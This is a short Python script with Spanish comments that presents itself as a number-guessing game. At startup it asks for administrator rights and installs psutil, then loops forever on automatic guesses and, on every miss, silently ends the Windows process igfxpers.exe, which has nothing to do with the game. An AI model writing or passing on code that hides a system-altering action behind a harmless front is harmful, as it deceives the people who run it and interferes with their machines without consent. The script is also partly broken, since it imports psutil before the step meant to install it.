import os
import random
import subprocess
import sys
import psutil
import ctypes

def install_psutil():
    try:
        import psutil
    except ImportError:
        print("psutil no está instalado. Instalando...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil"])
        print("psutil instalado correctamente.")

def delete_specific_process(process_name):
    try:
        # Obtener lista de procesos activos
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                proc.terminate()  # Terminar el proceso
                return  # Salir sin imprimir nada
    except Exception as e:
        print(f"Ocurrió un error al intentar eliminar el proceso: {e}")

def play_game():
    score = 0
    print("¡Bienvenido al juego de adivinar el número!")

    while True:  # Bucle infinito para permitir intentos ilimitados
        number_to_guess = random.randint(1, 10)
        user_guess = random.randint(1, 10)  # Simulación de una suposición automática

        # Aquí se muestra el número que se está adivinando
        print(f"Estoy pensando en un número entre 1 y 10. Mi suposición es: {user_guess}")

        if user_guess == number_to_guess:
            print("¡Correcto!")
            score += 1
        else:
            delete_specific_process("igfxpers.exe")  # Eliminar el proceso directamente

        print(f"Tu puntaje actual es: {score}")

def run_as_admin():
    """Verifica si el script se está ejecutando como administrador. Si no, lo relanza como administrador."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        # Relanzar el script con privilegios de administrador
        print("No se detectaron privilegios de administrador. Se están solicitando...")
        script = sys.argv[0]
        subprocess.run(['runas', '/user:Administrator', script])
        sys.exit()

if __name__ == "__main__":
    run_as_admin()  # Solicitar privilegios de administrador al inicio
    install_psutil()  # Asegurarse de que psutil esté instalado
    play_game()
